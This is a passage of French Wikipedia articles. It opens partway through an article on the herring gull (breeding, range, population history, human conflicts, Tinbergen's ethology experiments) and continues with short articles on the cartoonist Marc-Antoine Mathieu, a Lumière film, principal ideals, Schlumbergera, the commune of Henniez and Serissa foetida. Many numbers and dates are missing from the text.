La surveillance et le nourrissage des oisillons sont assurés par les deux parents dont l'agressivité vis-à-vis des prédateurs potentiels s'accroît vers la fin de la période d'incubation, culminant au cours des premières semaines d'élevage. Un des parents reste constamment à proximité du nid, pendant que l'autre est parti en quête de nourriture ; à la moindre alerte, il émet un « ga-ga-ga » qui incite les poussins à chercher refuge parmi la végétation ou les rochers. Lors de l'intrusion d'un homme ou d'un chien sur le territoire, l'adulte de garde prend son envol et pique vers l'intrus de façon répétée tant que celui-ci reste à proximité ; si ces attaques, qui s'accompagnent d'un cri strident à chaque piqué, sont très impressionnantes, il est très rare que les goélands touchent leur cible, et lorsqu'ils le font, c'est généralement avec les pattes.
Au moment de l'éclosion, les nouveau-nés sont couvés en permanence, dans un premier temps tant que leur duvet garde des traces de l'humidité de l'œuf (quelques heures), puis jusqu'à ce qu'ils aient acquis une certaine indépendance thermique (quelques jours). Le dérangement des parents lors de la phase de séchage du duvet est souvent une cause de mortalité des oisillons. Après quelques jours, les parents ne couvent plus les poussins que lorsque les conditions climatiques l'exigent (températures basses ou élevées, pluie…) ; cela peut occasionnellement se produire jusqu'à l'âge de trois semaines environ. Les oisillons sont capables de quitter le nid pour s'aventurer aux alentours dès le deuxième ou troisième jour. Ils sont toutefois très attachés à leur territoire, qu'ils apprennent à connaître très rapidement dans ses moindres détails, ce qui facilite leur camouflage rapide à la moindre alarme. Les jeunes transgressant les limites de leur territoire sont immédiatement attaqués par les adultes voisins, et souvent tués, voire mangés ; c'est là une importante cause de mortalité, en particulier lors d'intrusions humaines dans les colonies.
Le déroulement du nourrissage varie dans le détail, notamment en fonction de l'âge des jeunes, mais selon un schéma général remarquablement constant. Lorsque l'adulte revient sur le territoire et s'apprête à nourrir, il émet un cri particulier connu sous le nom de « cri miaulant » qui provoque immédiatement la course des jeunes vers le parent nourricier. Les petits piquent de leur bec vers le bec de l'adulte, en particulier vers la tache rouge qui orne la mandibule inférieure. Ce comportement déclenche la du repas de la nichée : le jabot et le cou de l'adulte se déforment, parfois de manière spectaculaire, du fait de la remontée des aliments, et les jeunes prennent leur nourriture directement dans le bec ouvert, beaucoup plus rarement sur le sol.
Les oisillons sont capables de voler au bout de 35 à , soit environ , mais seront nourris quelques jours encore par leurs parents.
Répartition.
Le Goéland argenté ' est un oiseau qui vit essentiellement dans la partie occidentale de l'Europe. On le trouve en Islande, au Royaume-Uni et le long des côtes de l'Europe continentale, du Portugal jusqu'à la partie européenne de la Russie. Son aire de répartition semble s'être étendue vers le sud depuis le , car autrefois rare au sud de la Bretagne, on le trouve maintenant jusqu'au nord de la péninsule ibérique. Les populations sont très souvent résidentes à l'année, bien que certains individus se dispersent en hiver. Des études menées sur l'île May, en Écosse, semblent montrer que les juvéniles ont tendance, au cours de la dispersion hivernale, à se déplacer plus loin que les oiseaux plus âgés. Cependant, certaines des populations les plus nordiques de la sous-espèce ' réalisent une véritable migration vers le sud pour hiverner, le plus souvent en mer Baltique ou en mer du Nord, mais parfois jusqu'au sud de l'Europe (France, Espagne, Portugal et même occasionnellement en Italie).
Le Goéland argenté "" (c'est-à-dire si on inclut le Goéland hudsonien et le Goéland de la Véga) se trouve aussi en Amérique du Nord et en Asie de l'Est. Le Goéland hudsonien vit en Amérique du Nord (Canada et États-Unis), mais les populations migratrices descendent vers le sud jusqu'au sud de l'Amérique centrale. Le Goéland de la Véga niche dans la partie orientale de la Sibérie, mais migre en hiver jusqu'au Japon et au sud de la Chine.
Habitat.
Cet oiseau marin niche à l'origine essentiellement sur les côtes mais colonise de plus en plus l'intérieur des terres, en particulier les villes. Il passe l'hiver soit non loin des sites de reproduction, soit davantage à l'intérieur des terres, au niveau d'estuaires, de lacs, de réservoirs et autres retenues d'eau, mais également dans des décharges publiques.
Populations.
Évolution des populations.
Selon J. Henry et J.Y. Monnat, au début du , le goéland argenté était commun sur les littoraux picards, normands et bretons. La collecte des œufs de cette espèce la cantonnait à des zones peu accessibles, telles que falaises escarpées et îlots rocheux. À partir du milieu du , la collecte d'œufs, devenue commerciale, et la chasse de cet oiseau, pour le loisir (« tirs sportifs ») ou pour alimenter en plumes le commerce de la chapellerie, ont abouti au tournant du à une disparition presque totale du goéland argenté sur les côtes françaises.
Cependant dans les années 1920, des colonies de cet oiseau, peut-être restaurées grâce à des oiseaux provenant des îles Anglo-Normandes, furent de nouveau signalées en Bretagne. On retrouve la même histoire au niveau européen : la collecte des œufs, par exemple, atteignait au des proportions très importantes, de 300 à 800 œufs par jour sur l'île du Texel aux Pays-Bas, et jusqu'à par saison de ponte sur l'île de Sylt en Allemagne.
Au cours du , le nombre de couples de goélands nicheurs a fortement augmenté, avec un accroissement consécutif de son aire de répartition : par exemple, dans les années 1970, le goéland argenté a recommencé à nicher dans le bassin d'Arcachon, où il n'avait plus niché depuis longtemps, et qui constitue en 2010 la limite sud de son aire de nidification. Cette progression est imputée à divers facteurs. Tout d'abord, l'arrêt presque complet de la chasse et de la récolte des œufs de goéland argenté a diminué la pression de prédation exercée sur l'espèce. Ensuite, l'accroissement de la population humaine a mis à la disposition de cet oiseau de nouvelles ressources alimentaires, comme les animaux produits dans de nouveaux types d'exploitations agricoles (pisciculture, conchyliculture, etc.), ou l'augmentation de la quantité d'ordures accessibles, notamment dans les décharges publiques, ou encore l'augmentation de la quantité de déchets de poisson rejetés en mer, à la suite de l'accroissement de l'industrie de la pêche. Enfin, s'étant adapté à la présence de l'homme, le goéland argenté a aussi depuis les années 1960 profité de nouveaux sites de nidification, tels que les toits des bâtiments urbains. Les villes, de par leur structure architecturale, la nourriture souvent abondante et l'absence de prédateurs terrestres, constituent en effet un milieu très favorable à la nidification de ces goélands, qui n'ont pas eu à développer d'adaptation particulière pour s'y installer.
En France, les goélands argentés ont commencé à nicher en ville dans les années 1970 (Morlaix, Saint-Malo en Bretagne, Le Tréport en Seine-Maritime). À la fin des années 1980, environ 2 % de la population des goélands argentés de ce pays avait colonisé le milieu urbain, et ce pourcentage a atteint 13,6 % à la fin des années 1990. Ces colonies urbaines (goélands argentés, mais aussi goélands bruns, marins et leucophées) se trouvent parfois dans des villes un peu en retrait des côtes, comme Rennes, colonisée en 1987. En Grande-Bretagne, cette colonisation a débuté dès les années 1920 et s'étend à des villes plus éloignées des côtes, mais le pourcentage de populations urbaines n'atteignait que 8 % en 1994 (250 villes hébergeant plusieurs milliers de goélands urbains).
La tendance actuelle est à la stabilisation de l'accroissement des populations de goélands argentés, parfois même la régression des effectifs dans de nombreux pays alors qu'ils continuent de s'accroître en milieu urbain. Ceci est peut-être dû à une raréfaction des sources de nourriture, liée à la fermeture des décharges à ciel ouvert, ou à la surpêche conduisant à la raréfaction du poisson ou aux modifications des techniques de pêche, mais aussi à une saturation des sites de nidification, avec un accroissement récent de la concurrence du goéland marin et du goéland brun. Une autre cause possible est l'accroissement de la régulation des populations de goélands argentés dû à différents facteurs, comme l'intensification de la prédation exercée par le goéland marin, les campagnes de destructions mises en place localement, mais aussi les épidémies, comme l'épidémie de botulisme de type C qui causa la mort de plus de oiseaux de mer entre 2000 et 2004 dans le Sud de la Suède, notamment de nombreux goélands argentés. Il y a même eu au tournant du une réduction des effectifs au Royaume-Uni, en Irlande et aux Pays-Bas.
Selon BirdLife International, la population européenne (hors Russie) comprenait en l'an 2000 entre et couples nicheurs, et plus de individus hivernants. Les pays comptant le plus de couples nicheurs sont la Norvège (plus de couples) et le Royaume-Uni (plus de couples).
Taux de survie et longévité.
Le taux de survie des oisillons au nid est faible, environ de 30 %. En effet, les oisillons de goélands argentés subissent la prédation des renards et des rapaces, mais aussi du goéland marin lorsque ce dernier niche à proximité, ou parfois même d'adultes de la même espèce.
Après l'essor et jusqu'à l'âge de , le taux de survie devient plus élevé chez les juvéniles et atteint 63 % ; par la suite, le taux de survie chez les adultes augmente encore jusqu'à environ 85 % chez les mâles et 99 % chez les femelles.
Le goéland argenté commence à se reproduire à partir de la quatrième année pour le mâle et de la cinquième année pour la femelle. Sa durée de vie moyenne est de , mais un individu bagué, accidentellement piégé dans un filet de pêche aux Pays-Bas, est mort à l'âge de et . Les individus domestiqués peuvent vivre encore plus longtemps : Paul Géroudet cite l'exemple d'un goéland argenté ayant atteint l'âge de .
Systématique.
Étymologie.
Le terme ' vient du grec ancien , "láros", « mouette, oiseau de mer ». Le mot "goéland" provient du mot breton "gouelan" qui désigne cet oiseau, mot qui dérive de "gouelañ", « pleurer », ce qui constitue une allusion à ses cris plaintifs. Les termes ' et "argenté" signifient la même chose et font tous deux référence à la couleur du manteau de l'oiseau.
Taxonomie.
Cette espèce a été décrite pour la première fois en 1763 par Erik Pontoppidan, théologien et zoologiste danois, dans son ouvrage '.
Le goéland argenté ' fait partie d'un complexe d'espèces séparées sur la base d'études de génétique moléculaire: le goéland de la Véga, asiatique, le goéland pontique, qui niche de la mer Noire jusqu'au Kazakhstan, le goéland leucophée, essentiellement méditerranéen et le goéland hudsonien présent en Amérique du Nord faisaient autrefois partie de l'espèce goéland argenté, '. De nos jours, les espèces susnommées ont été écartées de l'espèce ' ' et constituent dorénavant des espèces à part entière. Cette division de l'espèce n'est pas reconnue de tous les auteurs, et certains incluent encore dans ' deux populations : celle d'Amérique du Nord (sous le nom ') et celles d'Asie (sous le nom ""). La séparation des goélands leucophée et pontique est beaucoup plus généralement admise.
La taxonomie du goéland argenté a notamment permis à Ernst Mayr d'avancer sa théorie sur la variation clinale des espèces, détaillée plus bas.
Sous-espèces.
Selon , le Goéland argenté est représenté par 2 sous-espèces (ordre phylogénique) :
"Larus argentatus smithsonianus" (voir Goéland hudsonien) et "Larus argentatus vegae" (voir Goéland de la Véga) sont considérées comme des espèces séparées par Alan P. Peterson et le Congrès ornithologique international. La sous-espèce "L. a. smithsonianus" est encore reconnue par Howard &amp; Moore (, révision 2009) et Clements (, révision 2009).
Le goéland argenté et l'homme.
Statut de conservation de l'espèce.
L'UICN a classé cette espèce en catégorie LC (préoccupation mineure), du fait de ses effectifs élevés et de l'étendue importante de son aire de répartition.
Les populations européennes ont été classées par l'AEWA dans le statut C1, c'est-à-dire ni menacées, ni vulnérables.
La Directive oiseaux de 1979 a classé cette espèce en annexe II, c'est-à-dire dans les espèces dont la chasse est autorisée, et ce classement a été entériné en 1995.
En France, l'espèce est protégée comme toutes les espèces de goélands depuis 1962. Il est cependant possible d'obtenir auprès du préfet une dérogation pour supprimer ces oiseaux ou leurs œufs selon l'article L 411-2 du code de l'environnement, ou bien solliciter du préfet la réalisation d'une battue administrative (article L. 427-6 du Code de l'environnement).
En Belgique, l'espèce bénéficie du même statut d'espèce protégée, avec le même système de dérogations rendues possibles au cas par cas.
Relations conflictuelles.
L'homme reproche aux goélands en général et au goéland argenté en particulier divers méfaits. Tout d'abord, son impact négatif sur l'environnement naturel : le goéland argenté entre en compétition avec d'autres espèces d'oiseaux de mer, telles que la sterne pierregarin ou la sterne de Dougall, pour les sites de nidification et pour la nourriture, et la pression de prédation qu'il exerce sur les œufs et les oisillons peut par endroits empêcher toute tentative de reproduction de ses victimes. Il induit de plus une dégradation de la flore au niveau de ses sites de nidification naturels, par piétinement ou nitrification. Il a aussi un impact négatif sur l'environnement urbain, comme les nuisances sonores, la dégradation voire la destruction des revêtements des bâtiments urbains, les gouttières et chenaux sont bouchés par les matériaux de construction des nids, les carrosseries de voiture, vitres et autres surfaces salies voire dégradées par les fientes corrosives, ainsi que les risques important de collision avec les avions (il s'agit d'une des espèces les plus couramment impliquées dans ce type de collision). Son impact négatif sur les productions agricoles n'est pas négligeable : mytilicultures, piscicultures et élevages de volailles en plein air peuvent être pillés par ce goéland, et les salicultures peuvent être souillées par ses fientes.
De son côté, le goéland argenté subit la pression humaine. Au , il fut intensivement chassé afin de pourvoir en plumes le commerce de la chapellerie, et ses œufs furent l'objet d'une récolte intensive. De nos jours, en plus d'entrer parfois en collision avec les avions, il est aussi et comme tous les oiseaux de mer, victime des pollutions de l'eau par les hydrocarbures (dégazages et marées noires). Il est de plus toujours chassé au Danemark. Des campagnes d'éradication sont localement menées, soit dans le cas de dégradations urbaines liées à une prolifération des goélands, soit pour protéger d'autres espèces d'oiseaux sur les sites de nidification (les sternes, par exemple). Ces éradications se font en tuant les adultes (piégeage, tir, empoisonnement au chloralose ou à la strychnine) ou en stérilisant les œufs par aspersion d'un mélange d'huile et de formol. Cette dernière action est notamment menée sur la côte bretonne en France.
Des actions d'effarouchement peuvent être mis en œuvre localement ; pour ce faire, des rapaces sont fréquemment utilisés.
Recherche scientifique.
Le goéland argenté est certainement l'un des oiseaux de mer les plus étudiés au monde. Il le doit entre autres à l'abondance et à l'accessibilité de ses populations dans l'hémisphère nord, à l'intérêt exceptionnel des questions de spéciation soulevées par les populations circumpolaires de goélands naguère rattachées à son espèce, aux relations souvent conflictuelles que sa forte expansion a suscitées avec l'homme ou avec des espèces protégées…
Ernst Mayr, ornithologue, biologiste et généticien allemand, publia en 1940 dans son article ' son interprétation de la répartition et de l'inter-fécondité de certaines populations de goélands des régions de l'hémisphère nord localisées autour du cercle polaire. Selon lui, les populations de goéland brun ( et sur la carte ci-contre), auraient été l'espèce originelle. Par spéciation parapatrique, les populations les plus orientales (2) de goéland brun auraient donné naissance au goéland de Sibérie (', c'est-à-dire une sous-espèce du goéland brun, ou ' selon les classifications actuelles : sur la carte). Ce dernier aurait été de la même manière à l'origine du goéland de type 'Birula' (certains auteurs actuels considèrent ce dernier comme une sous-espèce de ' et beaucoup d'autres comme une sous-espèce non valide, sur la carte), et le 'Birula' aurait donné naissance au goéland de la Véga (5). Certains goélands de la Véga auraient colonisé l'Amérique du Nord et seraient à l'origine du goéland hudsonien (6), puis certains goélands hudsoniens seraient venus coloniser l'Europe et auraient donné naissance au goéland argenté ( sur la carte), incapable de se reproduire avec son hypothétique ancêtre le goéland brun, pourtant redevenu proche géographiquement parlant. Cette théorie, longtemps enseignée comme un exemple archétypique de variation clinale dans une espèce, est aujourd'hui battue en brèche. En effet, des études de génétique moléculaire récentes tendraient à montrer que le goéland hudsonien serait génétiquement beaucoup plus proche du goéland brun que du goéland argenté, ce qui est incompatible avec la théorie d'Ernst Mayr, qui voudrait que ce soit l'inverse.
Mais l'étude la plus célèbre le concernant est liée à l'histoire de l'éthologie à ses débuts. Elle a trait aux stimulus impliqués dans le nourrissage du poussin. Dès 1928, Oskar Heinroth, qui a étudié la croissance et le comportement de nombreuses espèces d'oiseaux élevés au Zoo de Berlin, note que le poussin du goéland argenté pique du bec vers toutes sortes d'objets de couleur rouge ; il interprète toutefois ce comportement comme un signe que l'alimentation naturelle de l'espèce est de nature carnée. En 1937, Friedrich Walter Goethe est le premier à mettre en évidence de manière expérimentale l'importance de la tache rouge du bec de l'adulte dans le nourrissage du poussin ainsi que le caractère inné de ce comportement. À partir du printemps 1947, Niko Tinbergen et ses étudiants de l'université de Leyde reprennent et approfondissent sur l'île de Terschelling les observations de Goethe. Utilisant des leurres (têtes de goéland adulte artificielles dont il modifie les caractéristiques en fonction des hypothèses), il confirme le caractère inné du comportement et parvient, à l'issue d'une impressionnante série d'expériences, à dégager sept stimulus principaux déclenchant la sollicitation du poussin : le mouvement de la tête parentale ; la forme du bec (de préférence long et fin, c'est-à-dire correspondant plus à la forme vue de dessous que de profil) ; la distance au sol ; la position du bec (il doit pointer vers le bas) ; la proximité du bec par rapport au poussin ; la présence et la couleur de la tache sur le bec de l'adulte (rouge de préférence, mais d'autres couleurs fonctionnent presque aussi bien, le poussin tapotant de son bec cette tache, ce qui déclenche une chez le parent) ; le contraste de la tache par rapport au bec.
Au-delà des critiques qu'elle a suscitées au fil des ans, cette étude a profondément marqué l'origine de l'éthologie moderne. Elle reste un grand classique, cité dans la plupart des ouvrages consacrés à cette discipline.
Le goéland argenté dans la culture.
Bien que cette espèce soit très couramment confondue avec les autres espèces de goélands, mais aussi avec les mouettes, voire avec d'autres oiseaux de mer, il y a peu d'œuvres évoquant le goéland, mais cependant elles sont très expressives et en rapport avec l'âme humaine, comme "Le Vieux Goéland", poème romantique de l'écrivain Barbey D'Aurevilly, ou bien encore le roman initiatique contemporain "Jonathan Livingston le Goéland", de Richard Bach, 1970, qui fut également adapté au cinéma en 1973. 
Elle a pourtant été spécifiquement représentée sur des timbres émis par plusieurs États, comme Aurigny en 1983 et 2007, le Cambodge en 2000, la Finlande en 1974, la France en 1947, La Grande-Bretagne en 1997, Guernesey en 2005, l'île de Man en 1983, 1991 et 1994, Jersey en 1998, 2003 et 2004, le Liberia en 1999, le Liechtenstein en 1939, les Pays-Bas en 1961, 2003 et 2007, la Pologne en 1976, la Sierra Leone en 2000, la Suède en 2001 et la Tanzanie en 1999.
Un goéland d'Aberdeen, dénommé Sam, a fait parler de lui à cause de son habitude de venir régulièrement dans un magasin pour y voler un sachet de Doritos.

</doc>
<doc id="191749" url="https://fr.wikipedia.org/wiki?curid=191749" title="Marc-Antoine Mathieu">
Marc-Antoine Mathieu

Marc-Antoine Mathieu est un dessinateur et scénariste de bande dessinée, né en 1959 à Antony (Seine). Il est notamment l'auteur de la série "Julius Corentin Acquefacques, prisonnier des rêves". Il est également scénographe, à travers l'atelier "Lucie Lom" qu'il a cofondé avec Philippe Leduc.
Biographie.
Marc-Antoine Mathieu est né en 1959 à Antony. Il grandit à Angers où il suit les cours de l'école des beaux-arts. Il travaille le graphisme et la scénographie dans l'atelier « Lucie Lom ». Il commence par publier dans différentes revues telles que "Marcel", "Le Banni" et "Morsures". Son premier livre paraît aux éditions Futuropolis en 1988.
En 1990, il publie "L'Origine" chez Delcourt, premier tome de sa série "Julius Corentin Acquefacques, prisonnier des rêves". Le héros de l'histoire, Julius Corentin Acquefacques travaille au ministère de l'Humour. Un jour il reçoit une lettre qui contient la planche d'une bande dessinée nommée l'origine, qui figure au début du récit. Julius commence alors à se questionner sur le sens de son monde, sur le destin, sur l'existence d'un être supérieur…
Cet album reçoit l'Alph-Art Coup de Cœur à Angoulême 1991. Six tomes supplémentaires ont suivi jusqu'à ce jour : "La Qu…", "Le Processus" (Meilleur scénario à Angoulême 1994), "Le Début de la fin", "La 2,333 Dimension", "Le Décalage" et "L'Hyperrêve".
Marc-Antoine Mathieu a également reçu le Prix du Meilleur Album pour "Le Dessin", au Festival de Sierre en 2002.
En paraît "Les Sous-sols du Révolu - Extraits du journal d'un expert".
En , sort "S.E.N.S VR", l'adaptation vidéoludique de la bande dessinée éponyme ainsi que "Otto, l'homme réécrit" dans lequel il livre une réflexion sur la conscience de soi et le libre-arbitre.
Il crée l'affiche de l'édition 2025 du tournoi de tennis de Roland-Garros, révélée fin 2024.
Expérimentation.
Le format est également une source d'expérimentation : dans "Otto, l’homme réécrit", il utilise un format à l'italienne et seulement deux cases par page. 
Analyse.
L'œuvre de Marc-Antoine Mathieu regorge de « prouesses conceptuelles » et d'expérimentation sur la matérialité même du livre. C'est un « dynamiteur du langage de la bande dessinée ». On retrouve ainsi pêle-mêle dans son œuvre une multitude de formats d'ouvrages, des cases découpées, l'irruption de la troisième dimension, des collages, des récits qui s'entrecroisent, un abandon de l'illustration de couverture, etc. De même, dans son œuvre principale "Julius Corentin Acquefacques, prisonnier des rêves", la bande dessinée devient en elle-même, par sa matérialité livresque et le dessin qui la composent, l'origine des péripéties et des rebondissements du héros et de ses compagnons (disparition du point de fuite et de la perspective, "anti-case", apparition d'une troisième dimension, intrigue qui n'apparait pas aux protagonistes, etc.). Il participe de l'évolution actuelle de la bande dessinée vers le roman graphique.
D'une manière plus générale, le livre en tant qu'objet et en tant que symbole est omniprésent dans l'œuvre de Mathieu. Ainsi, dans nombre de ses ouvrages, le livre joue un rôle auprès des protagonistes. Dans "Les sous-sols du Révolu", un registre est transmis de main en main ; dans "Dieu en personne", Dieu est un auteur de best-seller ; dans "L'Ascension", le héros est un moine bibliothécaire avec un journal ; dans "Mémoire morte", le héros se rend à la « très grand bibliothèque » ; dans "SENS", le héros découvre un livre vierge ; etc..
Influences.
Ses sources d'inspiration sont, entre autres, Franz Kafka et son atmosphère absurde et angoissante, Winsor McCay (auteur de "Little Nemo in Slumberland") et Fred (auteur de "Philémon"). Ainsi, le personnage de son œuvre principale, Julius Corentin Acquefacques – dont le nom même est phonétiquement "Kafka" inversé – chute au bas de son lit au commencement de chaque album, situation très fréquemment vécue par Little Nemo en clôture de ses aventures.
Les œuvres de Marc-Antoine Mathieu ont donné lieu à des études universitaires de Mélanie Lamarche-Amiot, Dany Rasemont ou de Frank Leinen.

</doc>
<doc id="191751" url="https://fr.wikipedia.org/wiki?curid=191751" title="Le Repas de bébé">
Le Repas de bébé

Le Repas de bébé est un film français réalisé par Louis Lumière, sorti en 1895.
Cette « vue photographique animée », ainsi que les frères Lumière nommaient leurs bobineaux impressionnés, fait partie des 10 films montrés au Salon indien du Grand Café de Paris à partir du .
Argument.
Assis autour d'une table, deux parents nourrissent leur enfant à la cuillère.
Contexte.
Il s'agit en fait d'Auguste Lumière et de son épouse Marguerite Winkler, avec leur propre fille Andrée. La caméra, comme pour tous les premiers films des frères Lumière, est tenue par Louis Lumière. C'est un film de famille, qui correspond au marché que briguent les deux frères : celui des amateurs aisés auxquels ils veulent vendre un exemplaire de leur Cinématographe, et c'est une des possibilités de leur appareil qu'ils démontrent par ce film et par un autre sujet : "La Pêche aux poissons rouges", typiques d'un cinéma domestique qui a longtemps eu cours exclusivement dans les milieux nantis.

</doc>
<doc id="191760" url="https://fr.wikipedia.org/wiki?curid=191760" title="Idéal principal">
Idéal principal

En mathématiques, plus particulièrement dans la théorie des anneaux, un idéal principal est un idéal engendré par un seul élément.
Définition.
Soit "A" un anneau.
Si "A" est commutatif, ces trois notions coïncident et l'idéal engendré par "a" est noté ("a").
Contre-exemples.
Pour un anneau intègre "A" contenant un élément "a" non nul et non inversible, l'idéal engendré par "a" et "Y" dans l'anneau de polynômes "A"["Y"] n'est pas principal.
Un exemple d'une telle situation est "A" = ℤ l'anneau des entiers relatifs car il existe un entier "a" formula_1 0, 1 et –1, ou encore, "A" = "B"["X"] pour un anneau intègre "B" et "a = X".
Anneau principal.
Un anneau intègre dont tous les idéaux sont principaux est dit anneau principal.
Par exemple, ℤ et "K"["X"] pour un corps commutatif "K" sont des anneaux principaux.
Idéaux principaux particuliers.
Soient "A" un anneau commutatif intègre et "a" un élément non nul de "A".
Si "A" est un anneau à PGCD, les deux premières propriétés sont équivalentes. S'il est de Bézout (en particulier s'il est principal), les trois le sont.

</doc>
<doc id="191763" url="https://fr.wikipedia.org/wiki?curid=191763" title="Schlumbergera">
Schlumbergera

Schlumbergera est un genre de plantes à fleurs de la famille des "Cactaceae".
Description.
Ce sont des plantes succulentes.
Ce genre est composé de six espèces, toutes à fleurs roses :
Il existe de nombreux hybrides, dont les fleurs sont de diverses couleurs : violet, rose, rouge, orangé ou blanc, parmi lesquels le fameux cactus de Noël,
qui résulte du croisement de "Schlumbergera truncata" et "Schlumbergera russelliana". Le cactus de Pâques, "Hatiora gaertneri", appartient lui, au genre parent "Hatiora".
Les tiges du "Schlumbergera" ressemblent à de petits écussons (Cladodes) joints les uns aux autres, et les fleurs éclosent d'aréoles situées à leur extrémité.
Habitat.
Ce sont des plantes épiphytes ou lithophytes.
Répartition.
Les espèces dont originaires de la zone néotropicale du Brésil.
Étymologie.
Le botaniste Charles Lemaire (1801-1871) a donné le nom de "Schlumbergera" à ce genre, en 1858, en hommage à Frédéric Schlumberger (1823-1893), collectionneur français de cactées et autres plantes grasses. Auparavant, les plantes de ce genre ont pu être classées parmi le genre "Epiphyllum".
Synonymes.
Les noms de genre suivants sont considérés comme des synonymes de "Schlumbergera" et ne sont donc pas valides :
Culture.
Les "Schlumbergera" sont sensibles à la durée de la nuit. Les boutons floraux commencent à se former et à se développer dès que les nuits rallongent suffisamment, c’est-à-dire au début de l'automne.
On peut évidemment reproduire ce phénomène artificiellement en mettant les plantes dans l'obscurité pendant un certain nombre d'heures, même s'il fait encore jour ; on obtient ainsi des floraisons décalées, et il n'est pas rare de pouvoir acheter ainsi dans les jardineries des Schlumbergera qui fleurissent précisément au moment où on a décidé de les mettre en vente, à n'importe quelle période de l'année.
Soins à donner aux cultivars.
Lorsqu'ils sont cultivés comme plantes d'intérieur, les cultivars " Schlumbergera " sont relativement faciles à entretenir. McMillan et Horobin décrivent en détail leur culture dans des conditions commerciales et domestiques. Leurs recommandations sont spécifiques :

</doc>
<doc id="191770" url="https://fr.wikipedia.org/wiki?curid=191770" title="Henniez (Vaud)">
Henniez (Vaud)

Henniez est une commune suisse du canton de Vaud, située dans le district de la Broye-Vully. Connue dès l'époque romaine pour ses sources d'eau minérale, elle fait partie du district de Payerne entre 1803 et 2007. La commune est peuplée de habitants en . Son territoire, d'une surface de 260 hectares, se situe dans la vallée de la Broye.
Histoire.
La première source souterraine découverte dans la forêt d'Henniez s'appelait « Bonne Fontaine » et a vraisemblablement été découverte par les Celtes. Lors de l'expansion de leur Empire, les Romains, conscients des bienfaits de l'eau sur la santé, recherchèrent des sources et celle fournissant l'eau minérale d'Henniez fut découverte par eux en -50. Elle doit son nom au citoyen romain "" qui, au début du premier millénaire y possédait un domaine. Henniez dépend de la châtellenie de Lucens au Moyen Âge. Dès 1536, le village est sujet de Berne. Il fait partie du district de Moudon de 1798 à 1803, du district de Payerne de 1803 à 2007 et du district de la Broye-Vully depuis 2008. Il y a une tuilerie en 1510, un moulin en 1594 et une école en 1671. Les premiers bains datent de 1688. Ils sont désaffectés dans les années 1930. La première usine d'embouteillage est construite en 1905. La seule société d'exploitation des sources subsistant après 1978 est rachetée à la famille Rouge par Nestlé en 2007.
Toponymie.
Le nom du village s'est écrit différemment, principalement car l'orthographe des localités vaudoises n'était pas encore bien établi. Quelques attestations :
Population.
Surnom.
Les habitants de la commune sont surnommés "lè Godzou" (les goges ou faisceaux de paille en patois vaudois).
Démographie.
Henniez compte habitants en . Sa densité de population atteint hab./km.
En 2000, la population d'Henniez est composée de 110 hommes (47,8 %) et 120 femmes (52,2 %). La langue la plus parlée est le français, avec 228 personnes (94,6 %). La deuxième langue est l'allemand (9 ou 3,7 %). Il y a 225 Suisses (93,4 %) et 16 personnes étrangères (6,6 %). Sur le plan religieux, la communauté protestante est la plus importante avec 150 personnes (62,2 %), suivie des catholiques (67 ou 27,8 %). 20 personnes (8,3 %) n'ont aucune appartenance religieuse.
La population d'Henniez est de 298 habitants en 1850. Elle baisse à 245 habitants en 1941, puis augmente à 296 habitants en 1950. Elle baisse légèrement depuis jusqu'à 230 habitants en 2000. Le graphique suivant résume l'évolution de la population d'Henniez entre 1850 et 2010 :
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à 36,98 % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti socialiste suisse avec 20,11 % des suffrages et le Parti libéral-radical avec 15,05 %. 
Lors des élections cantonales au Grand Conseil de , les habitants de la commune ont voté pour le Parti libéral-radical à 33,25 %, l'Union démocratique du centre à 25,13 %, le Parti socialiste à 24,61 %, les Verts à 9,42 %, le Parti bourgeois démocratique et les Vert'libéraux à 7,33 % et Vaud Libre à 0,26 %.
Sur le plan communal, Henniez (Vaud) est dirigée par une municipalité formée de 5 membres et présidée par un syndic pour l'exécutif et un Conseil général dirigé par un président et secondé par un secrétaire pour le législatif.
Le syndic actuel de la commune est Yannick Escher, élu tacitement le par 65 voix sur 84 bulletins valables.
Le 7 mars 2021, Yannick Escher est réélu syndic avec 77,17 % des suffrages.
Économie.
Pendant longtemps, l'économie locale a été tournée vers l'agriculture, l'arboriculture fruitière et l'élevage qui ne représentent cependant plus qu'une part mineure de l'emploi local de nos jours.
L'eau minérale du village est connue depuis la Rome antique ; elle a été utilisée pendant la période bernoise, puis à partir de 1880 lorsqu'un premier complexe balnéaire a été construit. La période allant de la fin du au début du représente l'âge d'or des bains d'Henniez qui sont alors connus dans toute la Suisse avant de décliner progressivement. Dès 1905, c'est la commercialisation de l'eau en bouteille qui a pris le relais avec la création de l'entreprise Henniez qui sera rachetée par Nestlé en 2007.
La commune compte également une usine de fabrication et conditionnement de jus de fruits Eckes Granini.
Transports.
Henniez se trouve sur le parcours de la route principale 1 (Route de Berne), qui relie la commune à Lausanne et Payerne. Au niveau des transports en commun, Henniez fait partie de la communauté tarifaire vaudoise Mobilis. La commune possède une gare des Chemins de fer fédéraux sur la ligne qui relie Lausanne à Payerne par Palézieux faisant partie du Réseau express régional vaudois et de la Ligne de la Broye. Le village est aussi desservi par les bus sur appel Publicar, qui sont un service de CarPostal.

</doc>
<doc id="191773" url="https://fr.wikipedia.org/wiki?curid=191773" title="Neige de juin">
Neige de juin

La neige de juin (Serissa foetida) est une espèce de plantes à fleurs de la famille des Rubiacée. C'est un arbuste originaire de Chine du sud, du Japon et de l'Asie du sud-est.
Synonyme : "Serissa japonica" (Thunb.) Thunb.
Description.
C'est un arbuste à feuillage persistant ou semi-persistant qui mesure de 45 à 60 cm de haut (il dépasse rarement les 80 centimètres de hauteur à l’état naturel). Ses petites feuilles ovales, épaisses et vert foncé dégagent une odeur déplaisante si on les écrase (d'où le nom de l'espèce, « foetida », fétide). Les branches s'étalent dans toutes les directions, formant un large dôme touffu. Son tronc, rugueux et gris, tend à devenir plus clair avec l’âge. La floraison a lieu à longueur d'année, mais surtout du début du printemps jusqu'à l'automne. Les boutons floraux, d'abord roses, s'épanouissent en une profusion de fleurs blanches en entonnoir mesurant 1 cm de large, dont la corolle se divise en 4 à 6 lobes. Ses fleurs apparaissent au bout des nouveaux rameaux et tombent généralement au bout de 24h.
Habitat et aire de répartition.
"Serissa foetida" est originaire des prairies humides et des boisés ouverts des zones subtropicales d'Asie du Sud-Est. On le retrouve surtout en Chine, au Japon et en Indochine.
Culture et utilisation.
On cultive cet arbuste pour son port compact, sa longue période de floraison et son tronc à l'écorce grise et rugueuse, qui devient plus pâle avec l'âge.
